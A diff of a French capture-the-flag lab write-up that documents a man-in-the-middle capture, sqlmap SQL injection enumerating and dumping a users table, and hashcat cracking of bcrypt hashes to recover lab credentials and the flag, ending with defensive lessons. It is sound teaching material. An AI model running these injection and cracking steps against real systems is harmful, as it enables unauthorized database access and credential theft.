@@ -61,7 +61,9 @@ Voici les commandes utilisées pour lancer chaque services:
 
 ### 3.1 Obtention des informations sur la communication entre le client et le terminal
 
-Ensuite faire une tentative de connexion avec un user name et mot de passe aléatoire pour communiquer avec le serveur terminal Korp.
+Une fois tous nos services lancés, nous commençons l'attaque par une tentative de connexion depuis le client. Le fait d'échouer n'est pas problèmatique dans notre cas.
+
+Notre serveur proxy produit pendant ce temps un fichier contenant les informations sur la connexion. On peut en voir le contenu ci dessous:
 
 ```text
 
@@ -94,6 +96,8 @@ Connection: close
 ```
 
 ### 3.2 Recupération de la description des tables
+
+Nous avons ensuite utilisé la commande suivante pour recupérer le nom des tables de la base de données du serveur.
 
 ```text
 user@motivation:~/Documents/sqlmap-dev $ python sqlmap.py -r /home/user/.mitmproxy/test.txt --ignore-code 401 -p username --tables
@@ -195,7 +199,11 @@ Database: korp_terminal
 [*] ending @ 16:40:01 /2025-12-09/
 ```
 
+Nous pouvons voir que la BDD `korp_terminal` contient une table nommée `users`.
+
 ### 3.3 Récuperation des tables
+
+Nous avons ensuite relancé sqlmap avec les nouveaux arguments suivant: `-D korp_terminal -T users --columns` pour obtenir le noms des differents champs de la BDD.
 
 ```text
 user@motivation:~/Documents/sqlmap-dev $ python sqlmap.py -r /home/user/.mitmproxy/test.txt -D korp_terminal -T users --columns --ignore-code 401
@@ -288,6 +296,8 @@ Table: users
 [*] ending @ 16:46:20 /2025-12-09/
 ```
 
+Cela nous permt de voir que la BDD contient notament un champ `username` et un champ `password`. Avec ces nouvelles informations, nous avons complété la commande sqlmap avec les  arguments suivant: `-D korp_terminal -T users -C username,password` pour obtenir les informations des champs `username` et `password`.
+
 ```text
 user@motivation:~/Documents/sqlmap-dev $ python sqlmap.py -r /home/user/.mitmproxy/test.txt -D korp_terminal -T users -C username,password --dump --igno
 re-code 401
@@ -357,6 +367,10 @@ Table: users
 [*] ending @ 16:50:05 /2025-12-09/
 ```
 
+Nous obtenons bien ici les noms des utilisateurs de KorpTerminal ainsi que les hashs des mots de passe associé.
+
+Nous avons créer le nouveau fichier `users` en reprenant le format suivant: `"username":"hash"`. On peut en voir le contenu ci-dessous.
+
 ```text
 user@motivation:~/Documents $ cat users
 test:$2y$10$1vSdN5jTa5S0ybMs.FXUwemfLxeBYGgjGsTDis.fuD6mx0lq9tLNe
@@ -366,42 +380,11 @@ admin:$2y$10$p34l3lUN9bZKhnT1.e891Ow.nrQnT7V73vt.IuOvfZH1Jygxsxps6
 
 ### 3.4 Récuperation des mots de passe
 
+Le logiciel `hashcat` demandans une certaine puissance de calcule et permetant une accéleration via carte graphique, nous avons transfert notre fichier `users` du Raspberry Pi  vers un autre ordinateur. Puis, nous avons decomprésser le dictionnaire que nous avons utilisé. Nous avons finalement pu lancer `hascat` comme repporté ci-dessous.
+
 ```text
 user@DESKTOP-5QE5MM5:~$ sudo gzip -d rockyou.txt.gz
 
-
-user@DESKTOP-5QE5MM5:~$ hashcat -m 3200 users rockyou.txt
-hashcat (v6.2.6) starting
-
-* Device #1: WARNING! Kernel exec timeout is not disabled.
-             This may cause "CL_OUT_OF_RESOURCES" or related errors.
-             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
-nvmlDeviceGetFanSpeed(): Not Supported
-
-CUDA API (CUDA 13.0)
-====================
-* Device #1: NVIDIA GeForce RTX 2060, 5105/6143 MB, 30MCU
-
-OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
-====================================================================================================================================================
-* Device #2: cpu-haswell-Intel(R) Core(TM) i5-9300H CPU @ 2.40GHz, 2874/5812 MB (1024 MB allocatable), 8MCU
-
-Minimum password length supported by kernel: 0
-Maximum password length supported by kernel: 72
-
-Hashfile 'users' on line 1 (test:$...emfLxeBYGgjGsTDis.fuD6mx0lq9tLNe): Token length exception
-Hashfile 'users' on line 2 (user:$...uoXkjubqZyksIrj9zkSOwAYTBmN4Zroi): Token length exception
-Hashfile 'users' on line 3 (admin:...Ow.nrQnT7V73vt.IuOvfZH1Jygxsxps6): Token length exception
-
-* Token length exception: 3/3 hashes
-  This error happens if the wrong hash type is specified, if the hashes are
-  malformed, or if input is otherwise not as expected (for example, if the
-  --username option is used but no username is present)
-
-No hashes loaded.
-
-Started: Tue Dec  9 18:04:18 2025
-Stopped: Tue Dec  9 18:04:20 2025
 user@DESKTOP-5QE5MM5:~$ hashcat -m 3200 users rockyou.txt --user
 hashcat (v6.2.6) starting
 
@@ -487,11 +470,36 @@ Stopped: Tue Dec  9 18:08:00 2025
 
 ```
 
+Hascat nous a bien retourné les mots de passe associer aux hashs fourni:
+
+```text
+$2y$10$1vSdN5jTa5S0ybMs.FXUwemfLxeBYGgjGsTDis.fuD6mx0lq9tLNe:cutest
+$2y$10$bfni4oATx18uvyU9Aff8yuoXkjubqZyksIrj9zkSOwAYTBmN4Zroi:username
+$2y$10$p34l3lUN9bZKhnT1.e891Ow.nrQnT7V73vt.IuOvfZH1Jygxsxps6:myprecious
+```
+
+On a pu en déduire les couples suivants:
+
+- `test` : `cutest`
+- `user` : `username`
+- `admin` : `myprecious`
+
 ### 3.5 Obtention du flag
 
-Tentaive de connexion avec user : `admin` et password : `myprecious` depuis le client
+Pour finir, nous avons effectué une tentative de connexion avec user : `admin` et password : `myprecious` depuis le client.
 
-Clearance to : Poly{t3rm1n4l_p4ssH4c4t_cr4ck1ng}
+Nous avons ainsi pu recupéré le flag : `Poly{t3rm1n4l_p4ssH4c4t_cr4ck1ng}`
+
 ![Alt text](./image/flag.png)
 
 ## Conclusion
+
+Pour conclure, nous avons pu au travers de ce TP mettre en place et d'exécuter une attaque "Man in the Middle". Nous avons démontré comment une simple interception du trafic réseau entre un client et un serveur peut mener à une compromission totale des données sensibles.
+
+Cette attaque illustre plusieurs failles de sécurité critiques :
+
+- L'absence de chiffrement du trafic HTTP
+- La vulnérabilité d'injection SQL non patchée
+- L'utilisation de mots de passe faibles et facilement devinable avec un dictionnaire
+
+En conclusion, ce TP démontre l'importance d'une stratégie de sécurité multicouche : utiliser HTTPS pour chiffrer le trafic, valider correctement les entrées utilisateur pour prévenir les injections SQL, et encourager l'utilisation de mots de passe forts et uniques. Cette approche en "boîte noire" nous a permis de mieux comprendre les risques liés à la position d'un attaquant en man-in-the-middle et l'importance de mettre en place des mesures de sécurité robustes.
